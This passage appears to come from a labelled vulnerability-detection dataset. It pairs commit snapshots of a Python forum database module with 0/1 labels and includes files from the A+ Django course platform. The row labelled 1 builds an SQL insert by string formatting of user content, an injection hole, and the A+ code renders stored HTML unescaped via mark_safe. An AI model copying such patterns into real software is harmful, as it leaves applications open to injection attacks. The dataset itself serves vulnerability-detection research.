  db = psycopg2.connect(database=DBNAME)
  c = db.cursor()
  c.execute(""select content,time from posts order by time desc"")
  return c.fetchall()
  db.close()

def add_post(content):
  """"""Add a post to the 'database' with the current timestamp.""""""
  db = psycopg2.connect(database=DBNAME)
  c = db.cursor()
  c.execute(""insert into posts values(%s)"",(content,))
  db.commit()
  db.close()
/n/n/n",0
115,115,1a5d6ccf02bec303d454f87a6bb39baed30c205f,"/vagrant/forum/forumdb.py/n/n# ""Database code"" for the DB Forum.

import psycopg2

DBNAME = ""forum""

def get_posts():
  """"""Return all posts from the 'database', most recent first.""""""
  db = psycopg2.connect(database=DBNAME)
  c = db.cursor()
  c.execute(""select content,time from posts order by time desc"")
  return c.fetchall()
  db.close()

def add_post(content):
  """"""Add a post to the 'database' with the current timestamp.""""""
  db = psycopg2.connect(database=DBNAME)
  c = db.cursor()
  c.execute(""insert into posts values('%s')"" % content)
  db.commit()
  db.close()
/n/n/n",1
28,28,face34e3e6fe0d0a87d5987e107a1a3e092d73e9,"aplus/api/__init__.py/n/nfrom django.urls import reverse
from rest_framework.settings import api_settings

def api_reverse(name, kwargs=None, **extra):
    if not kwargs:
        kwargs = {}
    kwargs.setdefault('version', api_settings.DEFAULT_VERSION)
    return reverse('api:' + name, kwargs=kwargs, **extra)
/n/n/naplus/settings.py/n/n####
# Default settings for A+ Django project.
# You should create local_settings.py to override any settings.
# You can copy local_settings.example.py and start from there.
##
from os.path import abspath, dirname, join
from django.utils.translation import ugettext_lazy as _
BASE_DIR = dirname(dirname(abspath(__file__)))


# Base options, commonly overridden in local_settings.py
##########################################################################
DEBUG = False
SECRET_KEY = None
ADMINS = (
    # ('Your Name', 'your_email@domain.com'),
)
#SERVER_EMAIL = 'root@'
EMAIL_TIMEOUT = 30 # Do not block web workers when email backend is broken
ALLOWED_HOSTS = [""*""]
##########################################################################


# Content (may override in local_settings.py)
#
# Any templates can be overridden by copying into
# local_templates/possible_path/template_name.html
##########################################################################
SITEWIDE_ALERT_TEXT = None
BRAND_NAME = 'A+'

WELCOME_TEXT = 'Welcome to A+ <small>modern learning environment</small>'
SHIBBOLETH_TITLE_TEXT = 'Aalto University users'
SHIBBOLETH_BODY_TEXT = 'Log in with Aalto University user account by clicking the button below. Programme students and faculty must login here.'
SHIBBOLETH_BUTTON_TEXT = 'Aalto Login'
MOOC_TITLE_TEXT = 'Users external to Aalto'
MOOC_BODY_TEXT = 'Some of our courses are open for everyone. Login with your user account from one of the following services.'
LOGIN_TITLE_TEXT = ''
LOGIN_BODY_TEXT = ''
LOGIN_BUTTON_TEXT = 'Maintenance login'
INTERNAL_USER_LABEL = 'Aalto'
EXTERNAL_USER_LABEL = 'MOOC'

WELCOME_TEXT_FI = 'A+ <small>verkkopohjainen oppimisympäristö</small>'
SHIBBOLETH_TITLE_TEXT_FI = 'Aalto-yliopiston käyttäjät'
SHIBBOLETH_BODY_TEXT_FI = 'Kirjaudu palveluun Aalto-yliopiston käyttäjätunnuksella alla olevasta painikkeesta. Koulutusohjelmien opiskelijoiden ja henkilökunnan pitää kirjautua tästä.'
SHIBBOLETH_BUTTON_TEXT_FI = 'Aalto-kirjautuminen'
MOOC_TITLE_TEXT_FI = 'Käyttäjät Aallon ulkopuolelta'
MOOC_BODY_TEXT_FI = 'Osa kursseistamme on avoinna kaikille. Kirjaudu sisään jonkin seuraavan palvelun käyttäjätunnuksellasi.'
LOGIN_TITLE_TEXT_FI = ''
LOGIN_BODY_TEXT_FI = ''
LOGIN_BUTTON_TEXT_FI = 'Ylläpidon kirjautuminen'

TRACKING_HTML = ''

EXCEL_CSV_DEFAULT_DELIMITER = ';'
##########################################################################

# Exercise loading settings
EXERCISE_HTTP_TIMEOUT = 15
EXERCISE_HTTP_RETRIES = (5,5,5)
EXERCISE_ERROR_SUBJECT = """"""A+ exercise error in {course}: {exercise}""""""
EXERCISE_ERROR_DESCRIPTION = """"""
As a course teacher or technical contact you were automatically emailed by A+ about the error incident. A student could not access or submit an exercise because the grading service used is offline or unable to produce valid response.

{message}

Open the exercise:
  {exercise_url}
Edit course email settings:
  {course_edit_url}

****************************************
Error trace:
****************************************

{error_trace}

****************************************
Request fields:
****************************************

{request_fields}
""""""

INSTALLED_APPS = (
    'django.contrib.contenttypes',
    'django.contrib.staticfiles',
    'django.contrib.sessions',
    'django.contrib.messages',
    'django.contrib.admin',
    'django.contrib.auth',
    'django.contrib.humanize',

    # 3rd party applications
    'bootstrapform',
    'rest_framework',
    'rest_framework.authtoken',

    # First party applications
    'inheritance',
    'userprofile',
    'authorization',
    'course',
    'exercise',
    'edit_course',
    'deviations',
    'notification',
    'external_services',
    'news',
    'threshold',
    'diploma',
    'apps',
    'redirect_old_urls',

    'js_jquery_toggle',
    'django_colortag',
)

# Different login options (may override in local_settings.py)
##########################################################################

## Shibboleth

#INSTALLED_APPS += ('shibboleth_login',)

# Apache module mod_uwsgi was unable to create UTF-8 environment variables.
# Problem was avoided by URL encoding in Shibboleth:
# <RequestMapper type=""Native"">
#   <RequestMap applicationId=""default"" encoding=""URL"" />
# </RequestMapper>
SHIBBOLETH_VARIABLES_URL_ENCODED = True

# Fields to receive from the Shibboleth (defaults).
#SHIB_USER_ID_KEY = 'SHIB_eppn'
#SHIB_FIRST_NAME_KEY = 'SHIB_displayName'
#SHIB_LAST_NAME_KEY = 'SHIB_sn'
#SHIB_MAIL_KEY = 'SHIB_mail'
#SHIB_STUDENT_ID_KEY = 'SHIB_schacPersonalUniqueCode'


## Google OAuth2 settings

#INSTALLED_APPS += ('social_django',)
#SOCIAL_AUTH_GOOGLE_OAUTH2_KEY = ''
#SOCIAL_AUTH_GOOGLE_OAUTH2_SECRET = ''
SOCIAL_AUTH_URL_NAMESPACE = 'social'
SOCIAL_AUTH_USERNAME_IS_FULL_EMAIL = True

##########################################################################

MIDDLEWARE = [
    'django.middleware.security.SecurityMiddleware',
    'django.contrib.sessions.middleware.SessionMiddleware',
    'django.middleware.csrf.CsrfViewMiddleware',
    'django.middleware.clickjacking.XFrameOptionsMiddleware',
    'django.contrib.auth.middleware.AuthenticationMiddleware',
    'django.contrib.auth.middleware.SessionAuthenticationMiddleware',
    'django.middleware.locale.LocaleMiddleware',
    'django.middleware.common.CommonMiddleware',
    'social_django.middleware.SocialAuthExceptionMiddleware',
    'django.contrib.messages.middleware.MessageMiddleware',
]

ROOT_URLCONF = 'aplus.urls'
LOGIN_REDIRECT_URL = ""/""
LOGIN_ERROR_URL = ""/accounts/login/""

TEMPLATES = [
    {
        'BACKEND': 'django.template.backends.django.DjangoTemplates',
        'DIRS': [
            join(BASE_DIR, 'local_templates'),
            join(BASE_DIR, 'templates'),
        ],
        'APP_DIRS': True,
        'OPTIONS': {
            'context_processors': [
                ""django.contrib.auth.context_processors.auth"",
                ""django.template.context_processors.debug"",
                'django.template.context_processors.request',
                ""django.template.context_processors.i18n"",
                ""django.template.context_processors.media"",
                ""django.template.context_processors.static"",
                ""django.contrib.messages.context_processors.messages"",
            ],
        },
    },
]

FILE_UPLOAD_HANDLERS = (
    #""django.core.files.uploadhandler.MemoryFileUploadHandler"",
    ""django.core.files.uploadhandler.TemporaryFileUploadHandler"",
)

WSGI_APPLICATION = 'aplus.wsgi.application'


# Database (override in local_settings.py)
# https://docs.djangoproject.com/en/1.7/ref/settings/#databases
##########################################################################
DATABASES = {
    'default': {
        'ENGINE': 'django.db.backends.sqlite3', # Add 'postgresql_psycopg2', 'postgresql', 'mysql', 'sqlite3' or 'oracle'.
        'NAME': join(BASE_DIR, 'aplus.db'), # Or path to database file if using sqlite3.
        'USER': '', # Not used with sqlite3.
        'PASSWORD': '', # Not used with sqlite3.
        'HOST': '', # Set to empty string for localhost. Not used with sqlite3.
        'PORT': '', # Set to empty string for default. Not used with sqlite3.
    }
}
##########################################################################

# Cache (override in local_settings.py)
# https://docs.djangoproject.com/en/1.10/topics/cache
##########################################################################
CACHES = {
    'default': {
        'BACKEND': 'lib.cache.backends.LocMemCache',
        'TIMEOUT': None,
        'OPTIONS': {'MAX_SIZE': 1000000}, # simulate memcached value limit
    }
}
#SESSION_ENGINE = 'django.contrib.sessions.backends.cached_db'
##########################################################################

# Internationalization (may override in local_settings.py)
# https://docs.djangoproject.com/en/1.7/topics/i18n/
LANGUAGE_CODE = 'en-gb'
LANGUAGES = [
    ('en', 'English'),
    ('fi', 'Finnish'),
]
TIME_ZONE = 'EET'
USE_I18N = True
USE_L10N = True
USE_TZ = True
FORMAT_MODULE_PATH = 'aplus'
LOCALE_PATHS = (
    join(BASE_DIR, 'locale'),
)

# Static files (CSS, JavaScript, Images)
# https://docs.djangoproject.com/en/1.7/howto/static-files/
STATICFILES_STORAGE = 'lib.storage.BumpStaticFilesStorage'
STATICFILES_DIRS = (
    join(BASE_DIR, 'assets'),
)
STATIC_URL = '/static/'
STATIC_ROOT = join(BASE_DIR, 'static')

MEDIA_URL = '/media/'
MEDIA_ROOT = join(BASE_DIR, 'media')

# Django REST Framework settings
# http://www.django-rest-framework.org/api-guide/settings/
REST_FRAMEWORK = {
    'DEFAULT_AUTHENTICATION_CLASSES': (
        # Clients should use token for authentication
        # Requires rest_framework.authtoken in apps.
        'rest_framework.authentication.TokenAuthentication',
        'lib.api.authentication.grader.GraderAuthentication',
        'rest_framework.authentication.SessionAuthentication',
    ),
    'DEFAULT_PERMISSION_CLASSES': (
        # If not other permissions are defined, require login.
        'rest_framework.permissions.IsAuthenticated',
        'userprofile.permissions.GraderUserCanOnlyRead',
    ),
    'DEFAULT_RENDERER_CLASSES': (
        'lib.api.core.APlusJSONRenderer',
        'rest_framework.renderers.BrowsableAPIRenderer',
    ),
    'DEFAULT_CONTENT_NEGOTIATION_CLASS': 'lib.api.core.APlusContentNegotiation',
    'DEFAULT_VERSIONING_CLASS': 'lib.api.core.APlusVersioning',
    'PAGE_SIZE': 100,
    'DEFAULT_VERSION': '2',
    'ALLOWED_VERSIONS': {
        # These are really just latest versions
        '1': '1.0',
        '2': '2.0',
    },
}


# Test environment url fixes are implemented using these. Typically not required for production
OVERRIDE_SUBMISSION_HOST = None
REMOTE_PAGE_HOSTS_MAP = None

# Maximum submissions limit for exercises that allow unofficial submissions.
# The exercise-specific max submissions limit may then be exceeded, however,
# this limit will prevent students from spamming massive amounts of submissions.
# Set this value to zero in order to remove the limit.
MAX_UNOFFICIAL_SUBMISSIONS = 200

# Testing
# https://docs.djangoproject.com/en/1.7/topics/testing/advanced/
TEST_RUNNER = ""xmlrunner.extra.djangotestrunner.XMLTestRunner""
TEST_OUTPUT_VERBOSE = True
TEST_OUTPUT_DESCRIPTIONS = True
TEST_OUTPUT_DIR = ""test_results""

# Logging
# https://docs.djangoproject.com/en/1.7/topics/logging/
from lib.logging import skip_unreadable_post
LOGGING = {
  'version': 1,
  'disable_existing_loggers': False,
  'formatters': {
    'verbose': {
      'format': '[%(asctime)s: %(levelname)s/%(module)s] %(message)s'
    },
    'colored': {
      '()': 'r_django_essentials.logging.SourceColorizeFormatter',
      'format': '[%(asctime)s: %(levelname)s/%(module)s] %(message)s',
      'colors': {
        'django.db.backends': {'fg': 'cyan'},
        'django.db.deferred': {'fg': 'yellow'},
        'cached': {'fg': 'red'},
      },
    },
  },
  'filters': {
    'skip_unreadable_post': {
        '()': 'django.utils.log.CallbackFilter',
        'callback': skip_unreadable_post,
    },
    'require_debug_true': {
      '()': 'django.utils.log.RequireDebugTrue',
    },
    'require_debug_false': {
      '()': 'django.utils.log.RequireDebugFalse',
    },
  },
  'handlers': {
    'debug_console': {
      'level': 'DEBUG',
      'filters': ['require_debug_true'],
      'class': 'logging.StreamHandler',
      'stream': 'ext://sys.stdout',
      'formatter': 'colored',
    },
    'console': {
      'level': 'DEBUG',
      'class': 'logging.StreamHandler',
      'stream': 'ext://sys.stdout',
      'formatter': 'verbose',
    },
    'email': {
      'level': 'ERROR',
      'filters': ['require_debug_false', 'skip_unreadable_post'],
      'class': 'django.utils.log.AdminEmailHandler',
    },
    'mail_admins': {
      # Duplicate of above, so if django internally refers it, we will use our filters
      'level': 'ERROR',
      'filters': ['require_debug_false', 'skip_unreadable_post'],
      'class': 'django.utils.log.AdminEmailHandler',
    },
  },
  'loggers': {
    '': {
      'level': 'INFO',
      'handlers': ['console', 'email'],
      'propagate': True
    },
    # Django defines these loggers internally, so we need to reconfigure them.
    'django': {
      'level': 'INFO',
      'handlers': ['console', 'email'],
    },
    'py.warnings': {
      'handlers': ['console'],
    },
  },
}





###############################################################################
#
# Logic to load settings from other files and tune them based on DEBUG
#
from os import environ
from r_django_essentials.conf import *

# Load settings from: local_settings, secret_key and environment
update_settings_with_file(__name__,
                          environ.get('APLUS_LOCAL_SETTINGS', 'local_settings'),
                          quiet='APLUS_LOCAL_SETTINGS' in environ)
update_settings_from_environment(__name__, 'DJANGO_') # FIXME: deprecated. was used with containers before, so keep it here for now.
update_settings_from_environment(__name__, 'APLUS_')
update_secret_from_file(__name__, environ.get('APLUS_SECRET_KEY_FILE', 'secret_key'))

# Complain if BASE_URL is not set
try:
    if not BASE_URL:
        raise RuntimeError('Local setting BASE_URL should be non-empty')
except NameError as e:
    raise RuntimeError('BASE_URL must be specified in local settings') from e

# update INSTALLED_APPS
if 'INSTALLED_LOGIN_APPS' in globals():
    INSTALLED_APPS = INSTALLED_LOGIN_APPS + INSTALLED_APPS

# update template loaders for production
use_cache_template_loader_in_production(__name__)

# setup authentication backends based on installed_apps
SOCIAL_AUTH = False
AUTHENTICATION_BACKENDS = (
    'django.contrib.auth.backends.ModelBackend',
)
if 'shibboleth_login' in INSTALLED_APPS:
    AUTHENTICATION_BACKENDS += ('shibboleth_login.auth_backend.ShibbolethAuthBackend',)
if 'social_django' in INSTALLED_APPS:
    SOCIAL_AUTH = True
    AUTHENTICATION_BACKENDS += ('social_core.backends.google.GoogleOAuth2',)



if DEBUG:
    # Allow basic auth for API when DEBUG is on
    REST_FRAMEWORK['DEFAULT_AUTHENTICATION_CLASSES'] += ('rest_framework.authentication.BasicAuthentication',)
    # Enable defer logging
    from lib.models import install_defer_logger
    install_defer_logger()
/n/n/napps/migrations/0001_initial.py/n/n# -*- coding: utf-8 -*-
from __future__ import unicode_literals

from django.db import models, migrations


class Migration(migrations.Migration):

    dependencies = [
        ('contenttypes', '0001_initial'),
        ('inheritance', '0001_initial'),
    ]

    operations = [
        migrations.CreateModel(
            name='BasePlugin',
            fields=[
                ('modelwithinheritance_ptr', models.OneToOneField(
                    to='inheritance.ModelWithInheritance',
                    on_delete=models.CASCADE,
                    parent_link=True, auto_created=True, primary_key=True,
                    serialize=False)),
                ('container_pk', models.TextField(verbose_name='object ID')),
                ('title', models.CharField(max_length=64)),
                ('views', models.CharField(blank=True, max_length=255)),
            ],
            options={
                'abstract': False,
            },
            bases=('inheritance.modelwithinheritance',),
        ),
        migrations.CreateModel(
            name='BaseTab',
            fields=[
                ('modelwithinheritance_ptr', models.OneToOneField(
                    to='inheritance.ModelWithInheritance',
                    on_delete=models.CASCADE,
                    parent_link=True, auto_created=True, primary_key=True,
                    serialize=False)),
                ('container_pk', models.TextField(verbose_name='object ID')),
                ('label', models.CharField(max_length=12)),
                ('title', models.CharField(max_length=64)),
                ('order', models.IntegerField(default=100)),
                ('opening_method', models.CharField(blank=True, max_length=32)),
            ],
            options={
                'ordering': ['order', 'id'],
            },
            bases=('inheritance.modelwithinheritance',),
        ),
        migrations.CreateModel(
            name='EmbeddedTab',
            fields=[
                ('basetab_ptr', models.OneToOneField(
                    to='apps.BaseTab',
                    on_delete=models.CASCADE,
                    parent_link=True, auto_created=True, primary_key=True,
                    serialize=False)),
                ('content_url', models.URLField(max_length=128)),
                ('element_id', models.CharField(blank=True, max_length=32)),
            ],
            options={
                'abstract': False,
            },
            bases=('apps.basetab',),
        ),
        migrations.CreateModel(
            name='ExternalIFramePlugin',
            fields=[
                ('baseplugin_ptr', models.OneToOneField(
                    to='apps.BasePlugin',
                    on_delete=models.CASCADE,
                    parent_link=True, auto_created=True, primary_key=True,
                    serialize=False)),
                ('service_url', models.URLField(max_length=255)),
                ('width', models.IntegerField()),
                ('height', models.IntegerField()),
            ],
            options={
                'abstract': False,
            },
            bases=('apps.baseplugin',),
        ),
        migrations.CreateModel(
            name='ExternalIFrameTab',
            fields=[
                ('basetab_ptr', models.OneToOneField(
                    to='apps.BaseTab',
                    on_delete=models.CASCADE,
                    parent_link=True, auto_created=True, primary_key=True,
                    serialize=False)),
                ('content_url', models.URLField(max_length=255)),
                ('width', models.IntegerField()),
                ('height', models.IntegerField()),
            ],
            options={
                'abstract': False,
            },
            bases=('apps.basetab',),
        ),
        migrations.CreateModel(
            name='HTMLPlugin',
            fields=[
                ('baseplugin_ptr', models.OneToOneField(
                    to='apps.BasePlugin',
                    on_delete=models.CASCADE,
                    parent_link=True, auto_created=True, primary_key=True,
                    serialize=False)),
                ('content', models.TextField()),
            ],
            options={
                'abstract': False,
            },
            bases=('apps.baseplugin',),
        ),
        migrations.CreateModel(
            name='HTMLTab',
            fields=[
                ('basetab_ptr', models.OneToOneField(
                    to='apps.BaseTab',
                    on_delete=models.CASCADE,
                    parent_link=True, auto_created=True, primary_key=True,
                    serialize=False)),
                ('content', models.TextField()),
            ],
            options={
                'abstract': False,
            },
            bases=('apps.basetab',),
        ),
        migrations.CreateModel(
            name='RSSPlugin',
            fields=[
                ('baseplugin_ptr', models.OneToOneField(
                    to='apps.BasePlugin',
                    on_delete=models.CASCADE,
                    parent_link=True, auto_created=True, primary_key=True,
                    serialize=False)),
                ('feed_url', models.URLField(max_length=256)),
            ],
            options={
                'abstract': False,
            },
            bases=('apps.baseplugin',),
        ),
        migrations.AddField(
            model_name='basetab',
            name='container_type',
            field=models.ForeignKey(to='contenttypes.ContentType', on_delete=models.CASCADE),
            preserve_default=True,
        ),
        migrations.AddField(
            model_name='baseplugin',
            name='container_type',
            field=models.ForeignKey(to='contenttypes.ContentType', on_delete=models.CASCADE),
            preserve_default=True,
        ),
    ]
/n/n/napps/models.py/n/n""""""
Plugins and tabs make it possible to customize the behavior and appearance of pages in this
system. Plugins are rendered as small ""boxes"" on the side of a page, where tabs have their own
pages which can be accessed through a tab-like user interface.

Any model can be related to a Plugin or Tab using a django.contrib.contenttypes.GenericRelation
field and naming AbstractApp fields container_pk & container_type for the link.
""""""

import datetime

from django.contrib.contenttypes.fields import GenericForeignKey
from django.contrib.contenttypes.models import ContentType
from django.db import models
from django.template import loader
from django.utils.safestring import mark_safe
from django.utils.translation import ugettext_lazy as _
import feedparser

from apps.app_renderers import ExternalIFramePluginRenderer, \
    ExternalIFrameTabRenderer, TabRenderer
from inheritance.models import ModelWithInheritance


class AbstractApp(ModelWithInheritance):

    # Generic foreign key implementation from Django contenttypes framework.
    container_type = models.ForeignKey(ContentType, on_delete=models.CASCADE)
    container_pk = models.TextField(_('object ID'))
    container = GenericForeignKey(ct_field=""container_type"", fk_field=""container_pk"")

    # Apps used to have an oembed reference which was removed in migration to Python 3
    # in favor of future implementations, for example LTI.

    class Meta:
        abstract = True


class BaseTab(AbstractApp):
    label = models.CharField(max_length=12,
        help_text=_(""Label is the word displayed on the tab.""))
    title = models.CharField(max_length=64,
        help_text=_(""Title is displayed on the top of the tab page.""))
    order = models.IntegerField(default=100)

    # A Tab can be opened in a new window, in the same window?
    opening_method = models.CharField(max_length=32, blank=True)

    def render(self):
        return _(""No content for this tab..."")

    def get_label(self):
        return self.label

    def get_container(self):
        if isinstance(self.container, ModelWithInheritance):
            return self.container.as_leaf_class()
        else:
            return self.container

    def get_renderer_class(self):
        raise NotImplementedError('Missing method implementation!')

    def __str__(self):
        return self.label

    class Meta:
        ordering = ['order', 'id']


class HTMLTab(BaseTab):
    content = models.TextField()

    def render(self):
        return mark_safe(self.content)


class ExternalEmbeddedTab(BaseTab):
    content_url = models.URLField(max_length=128)
    element_id = models.CharField(max_length=32, blank=True)

    def get_renderer_class(self):
        return TabRenderer


class ExternalIFrameTab(BaseTab):
    """"""
    An ExternalIFrameTab gets its content from an external url resource through
    an iframe which has the content_url as its src, possibly with additional
    url parameters.

    ExternalIFrameTab uses ExternalIFrameTabRenderer for rendering. Refer to
    its documentation for more information about the available url parameters.

    Iframes' width and height are fixed in the html document flow and thus they
    should be given explicitly and they should be the size of the expected
    content html.
    """"""

    content_url = models.URLField(max_length=255)

    # Desired width and height
    width = models.IntegerField()
    height = models.IntegerField()

    def get_renderer_class(self):
        return ExternalIFrameTabRenderer


class BasePlugin(AbstractApp):
    title = models.CharField(max_length=64)
    views = models.CharField(max_length=255, blank=True)

    def render(self):
        leaf = self.as_leaf_class()
        if leaf != self:
            return leaf.render()
        else:
            return _(""Base plug-in does not have a render-method."")


class RSSPlugin(BasePlugin):
    feed_url = models.URLField(max_length=256, blank=False)

    def render(self):
        doc = feedparser.parse(self.feed_url)
        feed = doc.feed

        sorted_entries = sorted(doc[""entries""], key=lambda entry: entry.published_parsed)
        sorted_entries.reverse()
        sorted_entries = sorted_entries[:5]

        # Set timestamps in a format that Django knows how to handle in templates
        for entry in sorted_entries:
            entry.django_timestamp = datetime.datetime(*entry.published_parsed[:7])

        out = loader.render_to_string(""plugins/rss.html"", {
            ""entries"": sorted_entries,
            ""title"": self.title,
            ""feed"": feed,
            ""plugin"": self
        })
        return out


class HTMLPlugin(BasePlugin):
    content = models.TextField(blank=False)

    def render(self):
        return mark_safe(self.content)


class ExternalIFramePlugin(BasePlugin):
    """"""
    An ExternalIFramePlugin gets its content from an external url resource
    through an iframe which has the content_url as its src, possibly with
    additional url parameters.

    ExternalIFramePlugin uses ExternalIFramePluginRenderer for rendering. Refer
    to its documentation for more information about the available url
    parameters and its view behaviour.

    Iframes' width and height are fixed in the html document flow and thus they
    should be given explicitly and they should be at least the size of the
    expected content html but at maximum the size available for the plugin in
    each view which varies among the views. The size of the rendered iframe
    will thus be the given width and height but at maximum the width and height
    available in the view.
    """"""

    service_url = models.URLField(max_length=255)

    # Desired width and height
    width = models.IntegerField()
    height = models.IntegerField()

    def get_renderer_class(self):
        return ExternalIFramePluginRenderer
/n/n/napps/templatetags/apps.py/n/nimport logging

from django import template

from apps.app_renderers import build_plugin_renderers
from course.models import CourseInstance
from exercise.exercise_models import BaseExercise
from exercise.submission_models import Submission


logger = logging.getLogger(""aplus.apps"")
register = template.Library()


@register.assignment_tag
def plugin_renderers(user, some_model, view_name=None):
    """"""
    Builds the plugin renderers for a view.
    """"""
    profile = user.userprofile if user.is_authenticated else None
    if isinstance(some_model, CourseInstance):
        return build_plugin_renderers(
            some_model.plugins.all(),
            view_name or ""course_instance"",
            user_profile=profile,
            course_instance=some_model,
        )
    if isinstance(some_model, BaseExercise):
        course_instance = some_model.course_instance
        return build_plugin_renderers(
            course_instance.plugins.all(),
            view_name or ""exercise"",
            user_profile=profile,
            exercise=some_model,
            course_instance=course_instance,
        )
    if isinstance(some_model, Submission):
        course_instance = some_model.exercise.course_instance
        return build_plugin_renderers(
            course_instance.plugins.all(),
            view_name or ""submission"",
            user_profile=profile,
            submission=some_model,
            exercise=some_model.exercise,
            course_instance=course_instance,
        )
    logger.warn(""Unrecognized model type received for plugin_renderers tag: {}"" \
                .format(str(type(some_model))))
    return []
/n/n/nauthorization/permissions.py/n/nfrom django.utils.translation import string_concat, ugettext_lazy as _

try:
    from django.utils.text import format_lazy
except ImportError: # implemented in Django 1.11
    from django.utils.functional import lazy as _lazy
    def _format_lazy(format_string, *args, **kwargs):
        return format_string.format(*args, **kwargs)
    format_lazy = _lazy(_format_lazy, str)

from lib.helpers import Enum

""""""
Base permission classes.

These classes use same interface than ones in django-rest-framework and
are usable with APIViews too. We define our superclass so we don't need to
depend on django-rest-framework.
""""""


SAFE_METHODS = ('GET', 'HEAD', 'OPTIONS')


class FilterBackend(object):
    """"""
    FilterBackend interface
    """"""
    def filter_queryset(self, request, queryset, view):
        """"""
        Return a filtered queryset.
        """"""
        raise NotImplementedError

    def get_fields(self, view):
        return []


class Permission(object):
    """"""
    Permission interface
    """"""
    def has_permission(self, request, view):
        """"""
        Return `True` if permission is granted, `False` otherwise.
        """"""
        return True

    def has_object_permission(self, request, view, obj):
        """"""
        Return `True` if permission is granted, `False` otherwise.
        """"""
        return True


class NoPermission(Permission):
    """"""
    Base Permission class that gives no access permission to anyone.
    """"""
    def has_permission(self, request, view):
        return False

    def has_object_permission(self, request, view, obj):
        return False


class MessageMixin(object):
    """"""
    Adds easy way to specify what exactly caused the PermissionDenied
    """"""
    def error_msg(self, message: str, delim=None, format=None, replace=False):
        """"""
        Add extra text to self.message about the reason why permission
        was denied. Uses lazy object so the message string is evaluated
        only when rendered.

        If optional argument `format` is given, then it's used with format_lazy
        to format the message with the dictionary arguments from `format` arg.

        Optional argument `delim` can be used to change the string used to join
        self.message and `message`.

        If optional argument `replace` is true, then self.message is replaced with
        the `message`.
        """"""
        if delim is None:
            delim = ': '

        if format:
            message = format_lazy(message, **format)

        if replace:
            self.message = message
        else:
            assert 'message' not in self.__dict__, (
                ""You are calling error_msg without replace=True ""
                ""after calling it with it firts. Fix your code by removing ""
                ""firts method call add replace=True to second method call too.""
            )
            self.message = string_concat(self.message, delim, message)


# Access mode
# ===========

# All access levels
ACCESS = Enum(
    ('ANONYMOUS', 0, _(""Any user authenticated or not"")),
    ('ENROLL', 1, None),
    ('STUDENT', 3, _(""Any authenticated student"")),
    ('ENROLLED', 4, _(""Enrolled student of the course"")),
    ('ASSISTANT', 5, _(""Assistant of the course"")),
    ('GRADING', 6, _(""Grading. Assistant if course has that option or teacher"")),
    ('TEACHER', 10, _(""Teacher of the course"")),
    ('SUPERUSER', 100, _(""Superuser of the service"")),
)


class AccessModePermission(MessageMixin, Permission):
    """"""
    If view has access_mode that is not anonymous, then require authentication
    """"""
    message = _(""Permission denied by access mode."")

    def has_permission(self, request, view):
        access_mode = view.get_access_mode()

        if access_mode == ACCESS.ANONYMOUS:
            return True
        if not request.user.is_authenticated:
            return False

        if access_mode >= ACCESS.SUPERUSER:
            return request.user.is_superuser

        if access_mode >= ACCESS.TEACHER:
            if not view.is_teacher:
                self.error_msg(_(""Only course teachers shall pass.""))
                return False

        elif access_mode >= ACCESS.ASSISTANT:
            if not view.is_course_staff:
                self.error_msg(_(""Only course staff shall pass.""))
                return False

        elif access_mode == ACCESS.ENROLLED:
            if not view.is_course_staff and not view.is_student:
                self.error_msg(_(""Only enrolled students shall pass.""))
                return False

        return True


# Object permissions
# ==================


class ObjectVisibleBasePermission(MessageMixin, Permission):
    model = None
    obj_var = None

    def has_permission(self, request, view):
        obj = getattr(view, self.obj_var, None)
        return (
            obj is None or
            self.has_object_permission(request, view, obj)
        )

    def has_object_permission(self, request, view, obj):
        user = request.user
        return (
            not isinstance(obj, self.model) or # skip objects that are not model in question
            user.is_staff or
            user.is_superuser or
            self.is_object_visible(request, view, obj)
        )

    def is_object_visible(self, request, view, obj):
        raise NotImplementedError
/n/n/ncourse/cache/menu.py/n/nfrom django.db.models.signals import post_save, post_delete, m2m_changed
from django.utils import timezone

from lib.cache import CachedAbstract
from ..models import StudentGroup, Enrollment, CourseInstance, Course
from ..renders import render_group_info


class CachedTopMenu(CachedAbstract):
    KEY_PREFIX = 'topmenu'

    def __init__(self, user):
        self.user = user
        super().__init__(user)

    def _generate_data(self, user, data=None):
        profile = user.userprofile if user and user.is_authenticated else None
        return {
            'courses': self._generate_courses(profile),
            'groups': self._generate_groups(profile),
        }

    def _generate_courses(self, profile):
        if not profile:
            return []

        def course_entry(instance):
            return {
                'name': str(instance),
                'link': instance.get_absolute_url(),
            }
        def divider_entry():
            return {
                'divider': True,
            }

        enrolled = []
        for instance in profile.enrolled.all():
            enrolled.append(course_entry(instance))

        teaching = []
        for course in profile.teaching_courses.all():
            for instance in course.instances.all():
                teaching.append(course_entry(instance))

        assisting = []
        for instance in profile.assisting_courses.all():
            assisting.append(course_entry(instance))

        courses = []
        courses.extend(enrolled)
        if courses and teaching:
            courses.append(divider_entry())
        courses.extend(teaching)
        if courses and assisting:
            courses.append(divider_entry())
        courses.extend(assisting)
        return courses

    def _generate_groups(self, profile):
        if not profile:
            return {}

        def group_entry(group):
            return {
                'id': group.id,
                'size': group.members.count(),
                'collaborators': group.collaborator_names(profile),
            }

        group_map = {}
        for enrollment in Enrollment.objects\
                .filter(user_profile=profile)\
                .select_related('selected_group')\
                .prefetch_related('selected_group__members'):
            instance_id = enrollment.course_instance_id
            group_map[instance_id] = (
                [
                    group_entry(g) for g in profile.groups\
                        .filter(course_instance_id=instance_id)\
                        .prefetch_related('members')
                ],
                render_group_info(enrollment.selected_group, profile)
            )
        return group_map

    def courses(self):
        return self.data['courses']

    def groups(self, instance):
        return self.data['groups'].get(instance.id, ([],None))


def invalidate_content(sender, instance, **kwargs):
    CachedTopMenu.invalidate(instance.user_profile.user)

def invalidate_assistants(sender, instance, reverse=False, **kwargs):
    if reverse:
        CachedTopMenu.invalidate(instance.user)
    else:
        for profile in instance.assistants.all():
            CachedTopMenu.invalidate(profile.user)

def invalidate_teachers(sender, instance, reverse=False, **kwargs):
    if reverse:
        CachedTopMenu.invalidate(instance.user)
    else:
        for profile in instance.teachers.all():
            CachedTopMenu.invalidate(profile.user)

def invalidate_members(sender, instance, reverse=False, **kwargs):
    if reverse:
        CachedTopMenu.invalidate(instance.user)
    else:
        for profile in instance.members.all():
            CachedTopMenu.invalidate(profile.user)


# Automatically invalidate cached menu when enrolled or edited.
post_save.connect(invalidate_content, sender=Enrollment)
post_delete.connect(invalidate_content, sender=Enrollment)
m2m_changed.connect(invalidate_assistants, sender=CourseInstance.assistants.through)
m2m_changed.connect(invalidate_teachers, sender=Course.teachers.through)
m2m_changed.connect(invalidate_members, sender=StudentGroup.members.through)
